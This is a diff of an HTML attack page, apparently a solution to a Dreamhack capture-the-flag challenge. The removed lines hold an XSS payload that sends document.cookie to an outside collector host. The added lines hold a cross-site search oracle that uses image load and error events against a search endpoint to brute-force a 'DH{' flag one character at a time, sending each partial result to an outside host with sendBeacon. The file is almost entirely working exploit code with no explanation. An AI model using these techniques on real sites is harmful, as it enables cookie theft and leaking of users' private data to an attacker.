@@ -1,23 +1,32 @@
 <!doctype html>
-<html>
 <body>
 <script>
-const payload = `<script>
-  (new Image()).src="https://lqfcdxi.request.dreamhack.games/leak?c="+encodeURIComponent(document.cookie);
-<\/script>`;
+const alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_';
+let known = 'DH{'; 
 
-const q = encodeURIComponent(payload);
+function probe(candidate) {
+  return new Promise(resolve => {
+    const img = new Image();
+    img.onload = () => resolve(true);  
+    img.onerror = () => resolve(false); 
+    img.src = 'http://localhost:3000/posts/search?query=' +
+              encodeURIComponent(candidate) + '&t=' + Math.random();
+    document.body.appendChild(img);
+  });
+}
 
-const warm = document.createElement("iframe");
-warm.style.display = "none";
-warm.src = "http://web:3000/?html=" + q;
-document.body.appendChild(warm);
-
-setTimeout(() => {
-  const x = document.createElement("iframe");
-  x.src = "http://web:3000/view?html=" + q;
-  document.body.appendChild(x);
-}, 300); 
+async function leak() {
+  while (!known.endsWith('}')) {
+    for (const c of alphabet) {
+      if (await probe(known + c)) {
+        known += c;
+        navigator.sendBeacon('https://bllcrad.request.dreamhack.games/leak', known);
+        break;
+      }
+    }
+  }
+  navigator.sendBeacon('https://bllcrad.request.dreamhack.games/leak', 'FLAG=' + known);
+}
+leak();
 </script>
 </body>
-</html>
